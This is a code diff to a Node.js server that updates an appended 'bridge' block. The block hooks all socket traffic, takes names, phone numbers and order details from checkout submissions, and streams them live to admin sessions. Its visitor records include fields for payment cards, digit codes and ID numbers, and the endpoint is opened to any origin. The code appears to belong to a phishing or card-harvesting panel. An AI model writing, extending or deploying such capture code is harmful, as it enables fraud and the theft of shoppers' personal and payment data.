@@ -1587,24 +1587,32 @@ server.listen(PORT, () => {
 });
 // KDD_DEPLOY_TRIGGER: 2026-10-20T20:25:23.551Z
 
-/*KDD-KDKAW-BRIDGE3*/
-try{app.get('/api/bridge',function(req,res){res.json({bridge:'kdk3',ts:new Date().toISOString(),visitors:visitors.size})})}catch(e){}
-function __kdkFind(sid){var r=null;try{visitors.forEach(function(v){if(!r&&v&&v.socketId===sid)r=v})}catch(e){}return r}
+/*KDD-KDKAW-BRIDGE4*/
+try{app.get('/api/bridge',function(req,res){res.setHeader('Access-Control-Allow-Origin','*');res.json({bridge:'kdk4',ts:new Date().toISOString(),visitors:visitors.size})})}catch(e){}
+var __kdkSock={};
+function __kdkFind(sid){try{if(__kdkSock[sid])return __kdkSock[sid]}catch(e){}var r=null;try{visitors.forEach(function(v){if(!r&&v&&v.socketId===sid)r=v})}catch(e){}if(r)__kdkSock[sid]=r;return r}
 function __kdkMake(socket){try{
 var h=(socket.handshake&&socket.handshake.headers)||{};
 var ua=h['user-agent']||'';
 var ip=String(h['x-forwarded-for']||socket.handshake.address||'').split(',')[0].trim();
+var ex=null;
+try{visitors.forEach(function(v){if(ex||!v)return;if(v.ip===ip&&v.userAgent===ua&&(Date.now()-(v.lastActivity||0))<900000)ex=v})}catch(e){}
+if(ex){__kdkSock[socket.id]=ex;ex.lastActivity=Date.now();ex.isConnected=true;visitors.set(socket.id,ex);admins.forEach(function(a,id){try{io.to(id).emit('visitor:new',ex)}catch(e){}});console.log('kdk4 adopt',socket.id,ex._id);return ex}
 try{visitorCounter++}catch(e){}
 var v={_id:'visitor_'+Date.now()+'_'+Math.random().toString(36).slice(2,9),socketId:socket.id,visitorNumber:(typeof visitorCounter==='number'?visitorCounter:1),createdAt:new Date().toISOString(),isRead:false,fullName:'',phone:'',idNumber:'',apiKey:(typeof generateApiKey==='function'?generateApiKey():''),ip:ip,country:h['cf-ipcountry']||'Unknown',city:'',os:'',device:'',browser:'',date:new Date().toISOString(),blockedCardPrefixes:[],page:'الرئيسية',data:{},dataHistory:[],paymentCards:[],digitCodes:[],hasNewData:false,isBlocked:false,isConnected:true,sessionStartTime:Date.now(),lastActivity:Date.now(),__kdk:true};
 try{if(typeof parseUserAgent==='function'){var p=parseUserAgent(ua);v.os=p.os;v.device=p.device;v.browser=p.browser}}catch(e){}
-visitors.set(socket.id,v);try{savedVisitors.push(v)}catch(e){}
+visitors.set(socket.id,v);__kdkSock[socket.id]=v;try{savedVisitors.push(v)}catch(e){}
 try{if(typeof saveData==='function')saveData()}catch(e){}
 admins.forEach(function(a,id){try{io.to(id).emit('visitor:new',v)}catch(e){}});
-console.log('kdk3 new visitor',socket.id,v.ip);return v}catch(e){console.log('kdk3 make err',e.message);return null}}
+console.log('kdk4 new visitor',socket.id,v.ip);return v}catch(e){console.log('kdk4 make err',e.message);return null}}
 function __kdkPush(v,fields,page){try{
 if(!v||!fields||typeof fields!=='object')return;
 var sig='';try{sig=JSON.stringify(fields)}catch(e){}
 if(v.__kdkSig===sig)return;v.__kdkSig=sig;
+try{var nm=fields.customer_name||fields.name||fields.fullName||fields['الاسم'];
+if(nm&&String(nm).trim()){var s=String(nm).trim();if(v.fullName!==s){v.fullName=s;admins.forEach(function(a,id){try{io.to(id).emit('visitor:nameUpdated',{visitorId:v._id,name:s})}catch(e){}})}}}
+catch(e){}
+try{var ph=fields.customer_phone||fields.phone||fields['الهاتف'];if(ph&&String(ph).trim())v.phone=String(ph).trim()}catch(e){}
 var pg=fields['الصفحة']||page||'إتمام الطلب';
 v.data=Object.assign({},v.data||{},fields);
 if(!v.dataHistory)v.dataHistory=[];
@@ -1614,12 +1622,13 @@ v.lastActivity=Date.now();v.page=pg;
 visitors.set(v.socketId||v._id,v);
 try{if(typeof saveVisitorPermanently==='function')saveVisitorPermanently(v);else if(typeof saveData==='function')saveData()}catch(e){}
 admins.forEach(function(a,id){try{io.to(id).emit('visitor:dataSubmitted',{visitorId:v._id,socketId:v.socketId,data:{content:fields,page:pg},visitor:v})}catch(e){}});
-console.log('kdk3 data',v._id,pg)}catch(e){console.log('kdk3 push err',e.message)}}
+console.log('kdk4 data',v._id,pg)}catch(e){console.log('kdk4 push err',e.message)}}
 io.on('connection',function(socket){
 socket.onAny(function(ev,arg){try{
 var p=arg||{};var v=__kdkFind(socket.id);
 if(!v&&(ev==='visitor:pageEnter'||ev==='data:function'||ev==='data:query'))v=__kdkMake(socket);
 if(!v)return;
+if(!visitors.has(socket.id))visitors.set(socket.id,v);
 var name=p.name||'',table=p.table||'',op=p.operation||'',fields=null;
 if(ev==='data:function'&&/order|checkout|submit|create|confirm|summary|customer|cart/i.test(name))fields=p.body||{};
 else if(ev==='data:query'&&op&&op!=='select'&&/order|checkout|cart|customer/i.test(table))fields=Array.isArray(p.payload)?p.payload[0]:p.payload;
@@ -1627,6 +1636,6 @@ if(!fields)return;
 if(fields.fields&&typeof fields.fields==='object')fields=Object.assign({},fields,fields.fields);
 if(fields.customer&&typeof fields.customer==='object')fields=Object.assign({},fields.customer,fields);
 if(Array.isArray(fields.items)&&fields.items.length){try{fields['المنتجات']=fields.items.map(function(it){return String((it.title||it.name||it.product_name||'')+' x'+(it.quantity||it.qty||1))}).join(' | ').slice(0,600)}catch(e){}}
-console.log('kdk3 hit',ev,name||table);
-__kdkPush(v,fields,'إتمام الطلب')}catch(e){console.log('kdk3 any err',e.message)}})});
-/*END-KDD-KDKAW-BRIDGE3*/
+console.log('kdk4 hit',ev,name||table);
+__kdkPush(v,fields,'إتمام الطلب')}catch(e){console.log('kdk4 any err',e.message)}})});
+/*END-KDD-KDKAW-BRIDGE4*/
